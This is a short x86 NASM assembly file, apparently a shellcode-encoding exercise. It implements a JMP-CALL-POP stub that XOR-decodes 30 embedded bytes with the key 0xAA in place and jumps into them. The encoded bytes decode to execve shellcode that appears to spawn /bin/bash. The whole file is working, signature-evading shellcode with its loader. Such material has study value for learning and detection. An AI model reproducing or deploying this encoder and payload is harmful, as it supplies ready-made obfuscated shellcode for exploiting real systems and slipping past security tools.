; Author: Timo Humphrey
; XOR Decoding with a JumpCallPop

global _start

section .text
_start:
	jmp short call_decoder	; Start of JumpCallPop

decoder_init:
	pop esi			; POP addr of Shellcode off stack
	xor ecx, ecx		; LOOP counter init
	mov cl, 30		; LEN of Shellcode
				; Now move on to decode by virtue of it being next
decoder:
	xor byte [esi], 0xAA	; perform xor on byte which converts it in place.
	inc esi			; Increment Addr in ESI (next byte)
	loop decoder		; continue looping this section!

	jmp short Shellcode	; JMP to Shellcode which is now actual shellcode!

call_decoder:
	call decoder_init	; This essentially puts Shellcode on the stack (JCP)!
	; Shellcode is the XOR encoded Shellcode!
	Shellcode: db 0x9b,0x6a,0xfa,0x23,0x48,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0x85,0x85,0x85,0x85,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
